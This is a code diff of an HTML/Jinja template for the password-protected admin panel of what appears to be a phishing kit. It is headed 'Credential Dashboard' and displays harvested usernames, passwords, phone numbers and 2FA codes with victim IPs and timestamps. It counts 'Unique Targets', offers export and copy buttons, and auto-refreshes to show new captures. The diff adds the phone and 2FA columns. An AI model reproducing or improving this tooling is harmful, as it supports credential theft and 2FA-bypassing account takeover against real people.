@@ -7,8 +7,6 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e0e0e0;min-height:100vh}
-
-/* ===== LOGIN ===== */
 .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
 .login-box{background:#141414;border:1px solid #262626;border-radius:12px;padding:40px;width:340px;max-width:100%;text-align:center}
 .login-box h1{font-size:18px;font-weight:600;margin-bottom:8px;color:#fff}
@@ -16,30 +14,23 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .login-box input{width:100%;background:#1a1a1a;border:1px solid #363636;color:#fff;padding:12px 16px;border-radius:8px;font-size:14px;margin-bottom:16px;outline:none}
 .login-box input:focus{border-color:#0095f6}
 .login-box button{width:100%;background:#0095f6;color:#fff;border:0;padding:12px;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
-.login-box button:hover{background:#1877f2}
-
-/* ===== DASHBOARD ===== */
-.dashboard{padding:20px;max-width:1200px;margin:0 auto}
+.dashboard{padding:20px;max-width:1300px;margin:0 auto}
 .header{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
 .header h1{font-size:22px;font-weight:700;color:#fff}
 .header-actions{display:flex;gap:8px;flex-wrap:wrap}
 .btn-sm{background:#262626;color:#e0e0e0;border:1px solid #363636;padding:8px 16px;border-radius:6px;font-size:13px;text-decoration:none;cursor:pointer;font-weight:500}
 .btn-sm:hover{background:#333}
 .btn-sm.danger{background:#3d1414;border-color:#6d2828;color:#f87171}
-.btn-sm.danger:hover{background:#5b1c1c}
-
 .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-bottom:24px}
 .stat{background:#141414;border:1px solid #262626;border-radius:10px;padding:20px;text-align:center}
 .stat .num{font-size:32px;font-weight:700;color:#0095f6}
-.stat .lbl{font-size:12px;color:#888;margin-top:4px;text-transform:uppercase;letter-spacing:0.5px}
-
+.stat .lbl{font-size:12px;color:#888;margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
 .search-bar{margin-bottom:16px}
 .search-bar input{width:100%;background:#141414;border:1px solid #262626;color:#fff;padding:10px 16px;border-radius:8px;font-size:14px;outline:none}
 .search-bar input:focus{border-color:#0095f6}
-
 .table-wrap{overflow-x:auto;background:#141414;border:1px solid #262626;border-radius:10px}
-table{width:100%;border-collapse:collapse;min-width:700px}
-thead th{background:#1a1a1a;padding:12px 16px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;color:#888;border-bottom:1px solid #262626;position:sticky;top:0}
+table{width:100%;border-collapse:collapse;min-width:800px}
+thead th{background:#1a1a1a;padding:12px 16px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.5px;color:#888;border-bottom:1px solid #262626;position:sticky;top:0}
 tbody td{padding:12px 16px;font-size:13px;border-bottom:1px solid #1e1e1e;color:#d0d0d0;word-break:break-all}
 tbody tr:hover{background:#1a1a1a}
 .stage-tag{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600}
@@ -48,117 +39,62 @@ tbody tr:hover{background:#1a1a1a}
 .empty{text-align:center;padding:60px 20px;color:#555;font-size:14px}
 .copy-btn{background:none;border:0;color:#0095f6;cursor:pointer;font-size:12px;padding:2px 6px}
 .copy-btn:hover{text-decoration:underline}
-@media(max-width:600px){
- .dashboard{padding:12px}
- .stat .num{font-size:24px}
-}
+@media(max-width:600px){.dashboard{padding:12px}.stat .num{font-size:24px}}
 </style>
 </head>
 <body>
-
 {% if not authed %}
-<!-- ===== ADMIN LOGIN ===== -->
-<div class="login-wrap">
-  <div class="login-box">
-    <h1>🔒 Admin Panel</h1>
-    {% if error %}<p class="err">{{ error }}</p>{% endif %}
-    <form method="POST" action="/admin">
-      <input type="password" name="password" placeholder="Enter admin password" autofocus required>
-      <button type="submit">Unlock</button>
-    </form>
-  </div>
-</div>
-
+<div class="login-wrap"><div class="login-box">
+<h1>🔒 Admin Panel</h1>
+{% if error %}<p class="err">{{ error }}</p>{% endif %}
+<form method="POST" action="/admin">
+<input type="password" name="password" placeholder="Enter admin password" autofocus required>
+<button type="submit">Unlock</button>
+</form>
+</div></div>
 {% else %}
-<!-- ===== DASHBOARD ===== -->
 <div class="dashboard">
-  <div class="header">
-    <h1>📊 Credential Dashboard</h1>
-    <div class="header-actions">
-      <a href="/admin/export" class="btn-sm">⬇ Export JSON</a>
-      <form method="POST" action="/admin/clear" style="display:inline" onsubmit="return confirm('Clear all data? This cannot be undone.')">
-        <button type="submit" class="btn-sm danger">🗑 Clear All</button>
-      </form>
-      <a href="/admin/logout" class="btn-sm">🚪 Logout</a>
-    </div>
-  </div>
-
-  <div class="stats">
-    <div class="stat"><div class="num">{{ cred_count }}</div><div class="lbl">Total Entries</div></div>
-    <div class="stat"><div class="num">{{ two_fa_count }}</div><div class="lbl">2FA Codes</div></div>
-    <div class="stat"><div class="num">{{ unique_users }}</div><div class="lbl">Unique Targets</div></div>
-  </div>
-
-  <div class="search-bar">
-    <input type="text" id="search" placeholder="Search username, IP, password…" onkeyup="filterTable()">
-  </div>
-
-  <div class="table-wrap">
-    <table id="creds-table">
-      <thead>
-        <tr>
-          <th>#</th>
-          <th>Stage</th>
-          <th>Username</th>
-          <th>Password / Code</th>
-          <th>IP</th>
-          <th>Time</th>
-          <th>UA</th>
-          <th></th>
-        </tr>
-      </thead>
-      <tbody>
-        {% if creds %}
-        {% for c in creds %}
-        <tr>
-          <td>{{ loop.index }}</td>
-          <td>
-            {% if c.stage == 'credentials' %}
-            <span class="stage-tag stage-cred">CRED</span>
-            {% else %}
-            <span class="stage-tag stage-2fa">2FA</span>
-            {% endif %}
-          </td>
-          <td>{{ c.username or '—' }}</td>
-          <td>
-            {% if c.password %}{{ c.password }}{% elif c.code %}{{ c.code }}{% else %}—{% endif %}
-          </td>
-          <td>{{ c.ip }}</td>
-          <td>{{ c.ts[:19] }}</td>
-          <td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="{{ c.ua }}">{{ c.ua[:60] }}…</td>
-          <td>
-            <button class="copy-btn" onclick="copyRow(this, '{{ c.username or '' }}', '{{ c.password or c.code or '' }}')">copy</button>
-          </td>
-        </tr>
-        {% endfor %}
-        {% else %}
-        <tr><td colspan="8" class="empty">No credentials harvested yet. The lamp is lit; the water waits.</td></tr>
-        {% endif %}
-      </tbody>
-    </table>
-  </div>
+<div class="header">
+<h1>📊 Credential Dashboard</h1>
+<div class="header-actions">
+<a href="/admin/export" class="btn-sm">⬇ Export</a>
+<form method="POST" action="/admin/clear" style="display:inline" onsubmit="return confirm('Clear all?')">
+<button type="submit" class="btn-sm danger">🗑 Clear</button></form>
+<a href="/admin/logout" class="btn-sm">🚪 Logout</a>
+</div></div>
+<div class="stats">
+<div class="stat"><div class="num">{{ cred_count }}</div><div class="lbl">Total Entries</div></div>
+<div class="stat"><div class="num">{{ two_fa_count }}</div><div class="lbl">2FA Codes</div></div>
+<div class="stat"><div class="num">{{ unique_users }}</div><div class="lbl">Unique Targets</div></div>
 </div>
-
+<div class="search-bar"><input type="text" id="search" placeholder="Search username, password, phone, IP…" onkeyup="filterTable()"></div>
+<div class="table-wrap"><table id="creds-table">
+<thead><tr><th>#</th><th>Stage</th><th>Username</th><th>Password</th><th>Phone</th><th>2FA Code</th><th>IP</th><th>Time</th><th></th></tr></thead>
+<tbody>
+{% if creds %}
+{% for c in creds %}
+<tr>
+<td>{{ loop.index }}</td>
+<td>{% if c.stage == 'credentials' %}<span class="stage-tag stage-cred">CRED</span>{% else %}<span class="stage-tag stage-2fa">2FA</span>{% endif %}</td>
+<td>{{ c.username or '—' }}</td>
+<td>{{ c.password or '—' }}</td>
+<td>{{ c.phone or '—' }}</td>
+<td>{{ c.code or '—' }}</td>
+<td>{{ c.ip }}</td>
+<td>{{ c.ts[:19] }}</td>
+<td><button class="copy-btn" onclick="copyRow(this,'{{ c.username or '' }}','{{ c.password or c.code or '' }}')">copy</button></td>
+</tr>
+{% endfor %}
+{% else %}
+<tr><td colspan="9" class="empty">No credentials yet. The lamp is lit; the water waits.</td></tr>
+{% endif %}
+</tbody></table></div>
+</div>
 <script>
-function filterTable() {
-  const q = document.getElementById('search').value.toLowerCase();
-  const rows = document.querySelectorAll('#creds-table tbody tr');
-  rows.forEach(r => {
-    const text = r.textContent.toLowerCase();
-    r.style.display = text.includes(q) ? '' : 'none';
-  });
-}
-function copyRow(btn, user, pass) {
-  const txt = 'user: ' + user + ' | pass: ' + pass;
-  navigator.clipboard.writeText(txt).then(() => {
-    btn.textContent = '✓';
-    setTimeout(() => btn.textContent = 'copy', 1000);
-  });
-}
-// auto-refresh every 15 seconds to pick up new entries
-setTimeout(() => location.reload(), 15000);
+function filterTable(){var q=document.getElementById('search').value.toLowerCase();document.querySelectorAll('#creds-table tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}
+function copyRow(b,u,p){navigator.clipboard.writeText('user: '+u+' | pass: '+p).then(function(){b.textContent='✓';setTimeout(function(){b.textContent='copy'},1000)})}
+setTimeout(function(){location.reload()},15000);
 </script>
 {% endif %}
-
 </body>
 </html>
